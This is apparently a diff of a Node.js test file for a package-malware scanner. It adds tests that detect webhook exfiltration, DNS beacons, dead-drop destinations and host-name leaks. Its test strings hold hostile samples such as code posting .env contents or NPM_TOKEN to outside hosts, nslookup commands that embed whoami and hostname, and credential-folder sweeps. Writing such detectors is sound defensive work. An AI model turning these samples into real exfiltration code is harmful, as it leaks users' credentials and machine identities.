@@ -1,12 +1,16 @@
-// 0.1.8: the exfiltration shapes in the npm engine — a chat bot or webhook
-// whose secret is written in the code, credential files sent to a raw IP
-// address, a sweep of credential folders, the host name sent to a hidden
-// address or in a DNS name, the public IP address sent to a capture service,
-// a copy of the environment serialized, a reverse shell as an argument list,
-// a miner, a raw socket and rewritten browser shortcuts at install time.
+// 0.1.8: the exfiltration shapes in the npm engine — a webhook whose secret
+// is written in the code (any service), local files sent to a raw IP address,
+// a sweep of credential folders, the host name sent to a hidden address or in
+// a DNS name, the public IP address sent to a capture service (local data read
+// as a flow; the list names where it goes), a reverse shell as an argument
+// list, a miner, a raw socket and rewritten browser shortcuts at install time;
+// 0.1.8: a DNS name built outside a template or in a shell command, a
+// destination fetched at run time (a dead drop), the host name read through
+// require('os').
 // Twin of python/tests/scanner/test_exfiltration_shapes.py; on a random
-// corpus the engines are held to each other by
-// tests/architecture/test_js_parity_hooks.py. The secrets are fake and built
+// corpus the engine is held to its recorded outputs by
+// tests/architecture/test_snapshot_signs.py (the npm package runs the
+// native engine). The secrets are fake and built
 // here; hosts are .invalid or TEST-NET; nothing is executed.
 
 import { test } from "node:test";
@@ -15,33 +19,44 @@ import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync } from "nod
 import { tmpdir } from "node:os";
 import { join, dirname } from "node:path";
 import { run, installScriptRisk, importTimeRisk, importTimeSeverity } from "../src/index.js";
-import { chatSecretAt, credentialSweepAt, minerAt, rawIpConnect } from "../src/lib/hooks.js";
+import { secretEndpointAt, credentialSweepAt, minerAt, rawIpConnect, dnsBeaconAt, deadDropAt } from "../src/lib/native.js";
 import { pyStripChars } from "../src/lib/pycompat.js";
 
 const TG = "1234567" + "89:AA" + "bC3dE5fG7hJ9kL1mN3pQ5rS7tV9wX1yZ3";
-const SLACK = "hooks.slack.com/services/" + "TABCDEF12/" + "BABCDEF12/" + "aBcDeFgHiJkLmNoPqRsTuVwX";
+const SLACK = "hooks.slack.com/services/" + "TABCDEF12/" + "BABCDEF12/" + "aBcDeFgHiJkLmNoPqRsTuV12";
+const KEY = "Zx9" + "Qw7Er5Ty3Ui1Op0As2Df4Gh6";
+const WEBHOOK = (host) => `sends data to a webhook whose secret is written in the code (${host})`;
 const XMR = "4" + "AbCdEfGhJk".repeat(10).slice(0, 94);
 const onImport = (text, lang = "js") => {
   const [reasons] = importTimeRisk(text, lang);
   return [reasons, reasons.length ? importTimeSeverity(reasons) : null];
 };
 
-test("a chat bot or webhook whose secret is in the code", () => {
+test("a webhook whose secret is in the code, any service", () => {
   const bot = "const { exec } = require('child_process');\nconst T = '" + TG + "';\n"
     + "exec(`curl -s \"https://api.telegram.org/bot${T}/sendMessage?chat_id=1&text=${t}\"`);\n";
-  assert.deepEqual(onImport(bot), [["sends data to a Telegram bot whose token is written in the code (bot 123456789)"], "CRITICAL"]);
+  assert.deepEqual(onImport(bot), [[WEBHOOK("api.telegram.org")], "CRITICAL"]);
   assert.deepEqual(onImport("var webhookUrl = 'https://" + SLACK + "';\nawait fetch(webhookUrl, {});\n"),
-    [["sends data to a Slack webhook whose key is written in the code (TABCDEF12)"], "CRITICAL"]);
-  // the user's token, a placeholder, no network call
-  assert.equal(chatSecretAt("const t = process.env.TG;\nfetch(`https://api.telegram.org/bot${t}/getMe`);\n"), null);
-  assert.equal(chatSecretAt("fetch('https://hooks.slack.com/services/T00000000/B00000000/" + "X".repeat(24) + "');\n"), null);
-  assert.equal(chatSecretAt("const T = '" + TG + "'; // https://api.telegram.org\n"), null);
+    [[WEBHOOK("hooks.slack.com")], "CRITICAL"]);
+  const xhr = "const x = new XMLHttpRequest();\nx.open('POST', 'https://in.x.invalid/w/" + KEY + "');\nx.send(d);\n";
+  assert.deepEqual(onImport(xhr), [[WEBHOOK("in.x.invalid")], "CRITICAL"]);
+  const wrapper = "import requests\nHOOK = 'https://hooks.x.invalid/in/" + KEY + "'\n"
+    + "def send(url, payload):\n    return requests.post(url, json=payload)\nsend(HOOK, {'m': 1})\n";
+  assert.deepEqual(onImport(wrapper, "py"), [[WEBHOOK("hooks.x.invalid")], "CRITICAL"]);
+  // the user's token, a placeholder, no network call, a path of words, a hash
+  for (const text of ["const t = process.env.TG;\nfetch(`https://api.telegram.org/bot${t}/getMe`);\n",
+    "fetch('https://hooks.slack.com/services/T00000000/B00000000/" + "X".repeat(24) + "');\n",
+    "const T = '" + TG + "'; // https://api.telegram.org\n",
+    "fetch('https://x.invalid/api/v2/GetUserProfileInformation');\n",
+    "fetch('https://x.invalid/c/3f2a1b4c5d6e7f8091a2b3c4d5e6f708');\n"]) {
+    assert.equal(secretEndpointAt(text), null, text);
+  }
 });
 
 test("credentials: files sent to an IP address, a sweep of folders", () => {
   const hrp = "const fs = require('fs');\nconst https = require('https');\nconst d = fs.readFileSync('.env', 'utf8');\n"
     + "https.get(`https://203.0.113.9:8855/1?data=${encodeURIComponent(d)}`);\n";
-  assert.deepEqual(onImport(hrp), [["reads credential files and sends data to an IP address (203.0.113.9)"], "CRITICAL"]);
+  assert.deepEqual(onImport(hrp), [["reads local files and sends them to an IP address (203.0.113.9)"], "CRITICAL"]);
   assert.deepEqual(onImport(hrp.replace("203.0.113.9", "10.0.0.9"))[0], []);
   const sweep = "const https = require('https');\nconst DIRS = ['.ssh', '.aws', '.ethereum', '.kube'].map((d) => join(home, d));\n";
   assert.deepEqual(credentialSweepAt(sweep), [sweep.indexOf("'.ssh'"), ["ssh", "aws", "ethereum", "kube"]]);
@@ -73,8 +88,82 @@ test("reverse shells as argument lists, miners, raw sockets and shortcuts at ins
   assert.ok(installScriptRisk(sock).includes("contacts an address typical of data exfiltration (203.0.113.5)"));
   assert.equal(rawIpConnect(sock.replace("203.0.113.5", "127.0.0.1")), null);
   assert.equal(rawIpConnect(sock.replace("203.0.113.5", "8.8.8.8")), null);
-  const lnk = "const s = shell.CreateShortcut(p + '.lnk');\ns.Arguments = '--load-extension=' + ext;\ns.Save();\n";
-  assert.ok(installScriptRisk(lnk).includes("rewrites browser shortcuts to load an extension"));
+  const lnk = "for (const f of glob.sync('*.lnk')) {\n  const s = shell.CreateShortcut(f);\n  s.Arguments = '--load-extension=' + ext;\n" +
+    "  s.Save();\n}\n";
+  assert.ok(installScriptRisk(lnk).includes("rewrites the shortcuts of programs on the machine"));
+  const own = "const s = shell.CreateShortcut(path.join(desktop, 'MyApp.lnk'));\ns.TargetPath = exe;\ns.Save();\n";
+  assert.ok(!installScriptRisk(own).includes("rewrites the shortcuts of programs on the machine"));
+});
+
+const DNS_BUILT = "sends the machine's user or host name in a DNS lookup of a name it builds";
+const DEAD_DROP = (host) => `sends the machine's user or host name to an address it fetches at run time (from ${host})`;
+
+test("a DNS name built from values in code or in a shell command (0.1.8)", () => {
+  for (const [text, lang] of [
+    ["const os = require('os');\nconst dns = require('dns');\nconst h = os.hostname();\ndns.lookup(h + '.u.x.invalid.com', () => {});\n", "js"],
+    ["const os = require('os'), dns = require('dns');\nconst q = os.hostname() + '.x.invalid.com';\ndns.resolve(q, () => {});\n", "js"],
+    ["import socket\nh = socket.gethostname()\nsocket.gethostbyname('%s.x.invalid.com' % h)\n", "py"],
+    ["import socket\nh = socket.gethostname()\nsocket.gethostbyname('{}.x.invalid.com'.format(h))\n", "py"],
+    ["import os, socket\nos.system('nslookup ' + socket.gethostname() + '.x.invalid.com')\n", "py"],
+  ]) {
+    const [reasons, sev] = onImport(text, lang);
+    assert.ok(reasons.includes(DNS_BUILT), text);
+    assert.equal(sev, "CRITICAL", text);
+  }
+  for (const cmd of ["nslookup $(whoami).$(hostname).x.invalid.com", "ping -c 1 `whoami`.x.invalid.com",
+    "nslookup %USERNAME%.%COMPUTERNAME%.x.invalid.com", "dig $USER.x.invalid.com",
+    "Resolve-DnsName $env:COMPUTERNAME.x.invalid.com"]) {
+    assert.ok(installScriptRisk(cmd).includes(DNS_BUILT), cmd);
+  }
+  // quiet: a machine looking itself up, a reserved domain, an assignment, the identity in a path
+  for (const text of ["import socket\nip = socket.gethostbyname(socket.gethostname())\n",
+    "const os = require('os'), dns = require('dns');\ndns.lookup(os.hostname() + '.internal', cb);\n",
+    "ping -c 1 $(hostname).local", "host=$(hostname).x.invalid.com", "curl -s http://x.invalid.com/$(whoami)"]) {
+    assert.equal(dnsBeaconAt(text, true), -1, text);
+  }
+});
+
+test("a dead drop: the destination fetched at run time from a literal URL (0.1.8)", () => {
+  for (const [text, lang, host] of [
+    ["import requests, socket\ncfg = requests.get('https://pastebin.com/raw/abc').json()\n"
+      + "requests.post(cfg['url'], json={'h': socket.gethostname()})\n", "py", "pastebin.com"],
+    ["const os = require('os');\nfetch('https://x.github.io/c.json').then((r) => r.json()).then((c) => "
+      + "fetch(c.hook, { method: 'POST', body: JSON.stringify({ h: os.hostname() }) }));\n", "js", "x.github.io"],
+    ["const os = require('os'), axios = require('axios');\n(async () => { const { data } = await axios.get("
+      + "'https://gist.githubusercontent.com/u/x/raw/c.json'); await axios.post(data.url, { h: os.hostname() }); })();\n",
+    "js", "gist.githubusercontent.com"],
+  ]) {
+    const [reasons, sev] = onImport(text, lang);
+    assert.ok(reasons.includes(DEAD_DROP(host)), text);
+    assert.equal(sev, "CRITICAL", text);
+    assert.ok(installScriptRisk(text).includes(DEAD_DROP(host)), text);
+  }
+  // quiet: a GET of the fetched address, a literal destination, no literal URL fetched, an update check
+  for (const text of ["import requests, socket\ncfg = requests.get('https://x.github.io/c.json').json()\n"
+    + "requests.get(cfg['url'])\nsocket.gethostname()\n",
+  "import requests, socket\ncfg = requests.get('https://x.github.io/c.json').json()\n"
+    + "requests.post('https://api.x.invalid/x', json=cfg)\nsocket.gethostname()\n",
+  "import requests, socket\ncfg = requests.get(base + '/c.json').json()\n"
+    + "requests.post(cfg['url'], json={'h': socket.gethostname()})\n",
+  "const os = require('os');\nfetch('https://registry.npmjs.org/x/latest').then((r) => r.json())"
+    + ".then((j) => { if (j.version !== v) console.log('update', j.version); });\nos.hostname();\n"]) {
+    assert.equal(deadDropAt(text), null, text);
+  }
+  // the shape without the host name read is no sign
+  const quiet = "import requests\ncfg = requests.get('https://pastebin.com/raw/abc').json()\n"
+    + "requests.post(cfg['url'], json={'v': 1})\n";
+  assert.notEqual(deadDropAt(quiet), null);
+  assert.deepEqual(onImport(quiet), [[], null]);
+});
+
+test("the host name read through require('os') or a destructured import (0.1.8)", () => {
+  for (const text of ["const req = require('https').request('https://x.invalid/', { method: 'POST' }, () => {});\n"
+    + "req.end(JSON.stringify({ h: require('os').hostname(), c: process.cwd() }));\n",
+  "const { hostname, platform } = require('os');\nfetch('https://x.invalid/', { method: 'POST', body: hostname() });\n",
+  "import { userInfo } from 'node:os';\nfetch('https://x.invalid/', { method: 'POST', body: userInfo().username });\n"]) {
+    assert.ok(installScriptRisk(text).includes("sends the machine's user or host name over the network"), text);
+  }
+  assert.deepEqual(installScriptRisk("const { a, b } = require('os');\nfetch('https://x.invalid/');\n"), []);
 });
 
 test("hostile inputs finish fast", () => {
@@ -87,6 +176,13 @@ test("hostile inputs finish fast", () => {
     "reverse shell args": "'nc'" + " '-x',".repeat(50000),
     monero: "'-o' exec(" + ("4" + "a".repeat(93) + "! ").repeat(5000),
     "a long line": 'getaddrinfo(f"' + "{a}.".repeat(50000) + "\n",
+    "dead drop fetches": "import socket\nsocket.gethostname()\n" + "c = requests.get('https://x.invalid/c').json()\n".repeat(5000)
+      + "requests.post(c['u'], data=1)\n".repeat(5000),
+    "dead drop chains": "const os = require('os');\nos.hostname();\nfetch('https://x.invalid/c')" + ".then((r) => r)".repeat(50000) + "\n",
+    "dead drop one line": "import socket\nsocket.gethostname()\nc = urlopen('https://x.invalid/c')\nx = c" + " + c".repeat(200000) + "\n",
+    "dns assigned names": "import socket\nsocket.gethostname()\n" + "q = h + '.x.invalid.com'\n".repeat(20000)
+      + "socket.gethostbyname(q)\n".repeat(20000),
+    "dns shell identities": "nslookup " + "$(whoami)".repeat(100000) + "\n" + "echo " + "$(whoami).x.invalid.com ".repeat(50000),
   };
   for (const [label, text] of Object.entries(texts)) {
     const start = performance.now();
@@ -96,18 +192,15 @@ test("hostile inputs finish fast", () => {
   }
 });
 
-test("a Slack team of only T and 0 is no key: str.strip('T0'), in linear time", () => {
-  // core: team.strip("T0"); a regex like /^[T0]+|[T0]+$/ would take quadratic
-  // time on a long run of 0s (CodeQL's js/polynomial-redos)
+test("str.strip(chars) in linear time", () => {
+  // a regex like /^[T0]+|[T0]+$/ would take quadratic time on a long run of
+  // 0s (CodeQL's js/polynomial-redos); the shell reader strips a host's brackets
   for (const [team, left] of [["T00000000", ""], ["T0000A000", "A"], ["TABCDEF12", "ABCDEF12"], ["", ""]]) {
     assert.equal(pyStripChars(team, "T0"), left, team);
   }
   const start = performance.now();
   assert.equal(pyStripChars("0".repeat(2_000_000) + "x", "T0"), "x");
   assert.ok(performance.now() - start < 1000);
-  const zeros = SLACK.replace("TABCDEF12", "T00000000");
-  assert.equal(chatSecretAt("fetch(u);\n" + zeros), null);
-  assert.equal(chatSecretAt("fetch(u);\n" + SLACK)[1], "sends data to a Slack webhook whose key is written in the code (TABCDEF12)");
 });
 
 test("--deps: a dependency whose main posts to a Slack webhook in its code", () => {
@@ -144,9 +237,12 @@ test("RequestBin by its host names only: requestBinary() is not an address", () 
   assert.deepEqual(installScriptRisk(installer), []);
   for (const host of ["requestbin.com", "enx1.x.requestbin.net", "requestbin.io", "requestb.in"]) {
     const text = `const https = require('https');\nhttps.get('https://${host}/r/abc?d=' + process.env.NPM_TOKEN);\n`;
-    assert.deepEqual(installScriptRisk(text),
-      [`contacts an address typical of data exfiltration (${host.split("x.").pop()})`], host);
+    // (0.1.8: a token in a request's address counts where the address is a capture service's)
+    assert.deepEqual(installScriptRisk(text), ["sends environment variables over the network (NPM_TOKEN)",
+      `contacts an address typical of data exfiltration (${host.split("x.").pop()})`], host);
   }
+  const mirror = "const https = require('https');\nhttps.get('https://mirror.x.invalid/d?t=' + process.env.NPM_TOKEN);\n";
+  assert.deepEqual(installScriptRisk(mirror), []);
   const beacon = "import socket, requests\nrequests.post('https://requestbin.net/r/abc', data=socket.gethostname())\n";
   assert.deepEqual(onImport(beacon, "py"),
     [["sends the machine's user or host name to a data-capture service (requestbin.net)"], "CRITICAL"]);
